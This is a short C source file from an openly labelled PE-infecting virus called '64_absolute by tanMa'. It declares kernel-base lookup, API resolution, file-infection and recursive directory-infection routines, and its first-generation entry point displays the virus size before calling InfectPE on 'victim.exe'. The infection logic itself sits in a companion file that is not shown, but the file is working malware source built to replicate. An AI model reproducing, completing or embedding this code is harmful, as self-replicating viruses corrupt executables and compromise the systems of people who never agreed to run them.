#include "64_absolute.h"
#pragma data_seg(".data1") //all data from 1st Gen. in this segment (will be discarded,does not exits in replications)

//defined in 64_absolute.c
extern VX_HEADER Virus_Header;
extern HMODULE hKernelInstance;
extern HMODULE GetKernelBase();
extern BOOL RetriveApis(void);
extern void InfectPE(LPCSTR lpFileName);
extern void InfectDirsAndSubDirs(LPCSTR lpPath);
extern USER_APIS User;

/*****************************************
 * Just needed to determinate virus size,
 * all functions under are discarded after 
 * infection (does not exist in replications)
*/
void VirusEnd(void)
{
}

/*****************************************
 * Entry point for 1st generation
 * 1st geneartion will infect victim.exe
 * in current directory
 */
void vxmain(void)
{
char cInfo[30];

	hKernelInstance = GetKernelBase();

	if( !RetriveApis() )
		return;

	User.awsprintfA(cInfo,"Virus size: %d",Virus_Size);
	User.aMessageBoxA(NULL, cInfo, "64_absolute by tanMa", MB_OK | MB_ICONEXCLAMATION);

	InfectPE("victim.exe");
}